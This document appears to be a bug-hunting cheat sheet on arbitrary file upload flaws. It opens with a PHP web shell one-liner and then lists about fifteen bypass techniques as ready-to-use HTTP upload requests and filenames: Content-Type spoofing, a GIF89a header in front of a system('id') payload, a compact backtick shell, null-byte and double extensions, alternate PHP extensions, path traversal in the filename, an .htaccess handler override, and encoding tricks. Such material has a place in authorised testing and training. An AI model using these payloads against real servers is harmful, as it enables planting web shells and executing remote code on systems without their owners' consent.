# Arbitrary File Upload

## Introduction
An arbitrary file upload vulnerability is a type of security flaw that allows an attacker to upload malicious files onto a server.
`<?php echo system($_GET['command']); ?>` => ur shell file 

## Where to find
In upload file feature, for example upload photo profile feature

## How to exploit
1. Change the `Content-Type` value
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```
Change the Content-Type
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/jpeg
```

2. Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
Content-Type: application/x-php
```
Change the request to this
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```

3. Upload the payload, but start with GIF89a; and
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system("id") ?>
```
And don't forget to change the content-type to image/gif

4. Bypass content length validation, it can be bypassed using small payload
```
(<?=`$_GET[x]`?>)
```

5. Using null byte in filename
```
file.php%00.gif
```

6. Using double extensions for the uploaded file
```
file.jpg.php
```

7.  Uploading an unpopular php extensions (php4,php5,php6,phtml)
```
file.php5
```

8. Try to randomly capitalizes the file extension
```
file.pHP5
```
10. include directory traversal sequence (uploaded to a higher directory in the filesystem)
```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
- hint => use the LFI techniques to bypass the dir traversal protection
GET /files/avatars/..%2fexploit.php
```
11. If php files are blacklisted ? 
	 - upload first a conf file that allows u to execute php files 
		- upload .htaccess file that have the following contnet `AddType application/x-httpd-php ".test"`
		- this means if u upload a .test file, it will be treated as .php file
		- upload ur .test shell file 
12. Add trailing Chars 
```
exploit.php.
```
13. Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes.
```
exploit%2Ephp
```
14. Add semicolons before the file extensions
```
exploit.php;.jpg
```
15. multibyte unicode characters `xC0 x2E`, `xC4 xAE` or `xC0 xAE`
```
exploit%xC0%x2Ephp
exploit%xC4%xAEphp
exploit%xC0%xAEphp
```
